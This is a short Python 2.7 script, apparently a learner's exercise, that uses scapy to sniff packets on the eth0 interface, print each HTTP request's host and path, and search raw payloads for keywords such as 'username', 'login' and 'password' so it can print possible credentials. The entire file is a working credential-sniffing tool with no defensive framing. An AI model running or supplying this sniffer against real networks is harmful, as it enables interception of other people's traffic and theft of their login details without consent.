#!/usr/bin/env
 
#This is a python packet sniffer for python 2.7

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sinffed_packet)
    # store=False tells scapy to not store the data im memmory

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load  # printing the raw layer of the packet and the load feild of the packet
        keywords = ["username", "login", "user", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sinffed_packet(packet): #pinting out the packet info that is only log in info
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0") #Inside the "" is the interface I want to sniff
